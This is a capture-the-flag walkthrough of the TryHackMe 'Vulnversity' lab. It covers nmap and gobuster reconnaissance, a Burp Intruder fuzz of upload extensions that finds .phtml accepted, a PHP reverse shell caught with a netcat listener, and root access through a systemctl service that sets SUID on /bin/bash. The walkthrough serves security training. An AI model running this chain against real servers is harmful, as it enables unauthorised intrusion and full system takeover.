# [Vulnversity](https://tryhackme.com/room/vulnversity)

## Task 2: Reconnaissance
Gather information about this machine using a network scanning tool called `nmap`.
```
ip=10.10.124.187
ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports $ip
```
**Output:**
> ```
> Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-23 03:58 EDT
Nmap scan report for 10.10.124.187
Host is up (0.20s latency).
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: mean: 1h20m03s, deviation: 2h18m35s, median: 2s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2021-06-23T03:58:50-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-06-23T07:58:50
|_  start_date: N/A
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.15 seconds
```

- Scan the box, how many ports are open?

  *6*

- What version of the squid proxy is running on the machine?

  3.5.12

- How many ports will nmap scan if the flag -p-400 was used?

  400
- Using the nmap flag -n what will it not resolve?

  DNS
- What is the most likely operating system this machine is running?

  ubuntu
- What port is the web server running on?

  3333

## Task 3: Locating directories using GoBuster
Using a fast directory discovery tool called `GoBuster` you will locate a directory that you can use to upload a shell to.

```
gobuster -u http://$ip:3333 -w /usr/share/wordlists/dirb/common.txt -x xxa dir
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.193.119:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              xxa
[+] Timeout:                 10s
===============================================================
2021/06/23 10:13:40 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 294]
/.htaccess            (Status: 403) [Size: 299]
/.hta.xxa             (Status: 403) [Size: 298]
/.htpasswd            (Status: 403) [Size: 299]
/.htaccess.xxa        (Status: 403) [Size: 303]
/.htpasswd.xxa        (Status: 403) [Size: 303]
/css                  (Status: 301) [Size: 319] [--> http://10.10.193.119:3333/css/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.193.119:3333/fonts/]
/images               (Status: 301) [Size: 322] [--> http://10.10.193.119:3333/images/]
/index.html           (Status: 200) [Size: 33014]
/internal             (Status: 301) [Size: 324] [--> http://10.10.193.119:3333/internal/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.193.119:3333/js/]
/server-status        (Status: 403) [Size: 303]

===============================================================
2021/06/23 10:16:05 Finished
===============================================================
```
- What is the directory that has an upload form page?

  /internal

## Task 4: Compromise the webserver
Now you have found a form to upload files, we can leverage this to upload and execute our payload that will lead to compromising the web server.

- Try upload a few file types to the server, what common extension seems to be blocked?

  .php

Setup your burp project and perform the upload again with intercept on. Send the intercepted request to intruder and set the attack type as `sniper attack`. Do the necessary changes in positions tab as follows
```
POST /internal/index.php HTTP/1.1
Host: 10.10.193.119:3333
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------858931554880102503911834712
Content-Length: 171027
Origin: http://10.10.193.119:3333
Connection: close
Referer: http://10.10.193.119:3333/internal/index.php
Upgrade-Insecure-Requests: 1
-----------------------------858931554880102503911834712
Content-Disposition: form-data; name="file"; filename="php-reverse-shell.§php§"
Content-Type: application/x-php
```
Now in the payloads tab set payload type as simple list and add the following extensions in the list
```
php
php3
php4
php5
phtml
```
- Run this attack, what extension is allowed?

  phtml

Now we know that phtml extension is allowed so we will upload the payloads as `.phtml`. Download the payload from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and change the ip address with my ip address. Note the port also. Save the file with `.phtml` extension. Upload it in the form. You will receve a success message.

Now start a nc listener at that port on attack machine using `nc -lvnp 1234`.

Navigate to *http://<ip>:3333/internal/uploads/shell.phtml*. You will receive a reverse shell on the nc listener.
```
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ cd /home
$ ls
bill
$ cd bill
$ ls
user.txt
$ cat user.txt

```
- What is the name of the user who manages the webserver?

  bill
- What is the user flag?

  8b\******db

## Task 5: Privilege Escalation
Now you have compromised this machine, we are going to escalate our privileges and become the superuser (root).

For finding SUID executables use the following:
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Among all the files `systemctl` stands out. Also there is a method to get elevated access via systemctl in [GTFOBins]. Using that we will set suid enabled for /bin/bash. And then we will get the root user.
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
**Output:**
```
www-data@vulnuniversity:/home/bill$ TF=$(mktemp).service
www-data@vulnuniversity:/home/bill$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "chmod +s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/home/bill$ /bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.Hqv2A6WkEU.service to /tmp/tmp.Hqv2A6WkEU.service.
www-data@vulnuniversity:/home/bill$ /bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.Hqv2A6WkEU.service to /tmp/tmp.Hqv2A6WkEU.service.
www-data@vulnuniversity:/home/bill$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
www-data@vulnuniversity:/home/bill$ /bin/bash -p
bash-4.3# whoami
root
bash-4.3# ls
user.txt
bash-4.3# cd /root
bash-4.3# ls
root.txt
bash-4.3# cat root.txt
```

- On the system, search for all SUID files. What file stands out?

  /bin/systemctl
- Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?
Become root and get the last flag (/root/root.txt)

  a58\******c7fd5
